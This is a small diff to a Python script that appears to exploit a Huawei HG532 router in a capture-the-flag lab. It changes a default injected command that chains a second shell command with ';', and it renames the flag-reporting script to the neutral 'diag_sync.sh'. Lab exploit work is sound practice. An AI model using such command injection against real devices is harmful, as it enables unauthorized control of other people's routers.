@@ -6,7 +6,7 @@ import requests
 from requests.auth import HTTPDigestAuth
 
 HEADERS = {'Content-Type': 'text/xml; charset="utf-8"'}
-DEFAULT_CMD = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/report_flag.sh"
+DEFAULT_CMD = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/diag_sync.sh"
 
 session = requests.Session()
 session.trust_env = False
@@ -125,7 +125,7 @@ def main():
         print("\nstatus_code: " + str(r.status_code))
         print("\n" + r.text)
         if r.status_code == 200 and (
-            "/bin/check_cache.sh" in cmd or "/bin/report_flag.sh" in cmd
+            "/bin/check_cache.sh" in cmd or "/bin/diag_sync.sh" in cmd
         ):
             if not recv_flag(args.host, args.port, args.flag_timeout):
                 raise SystemExit(1)
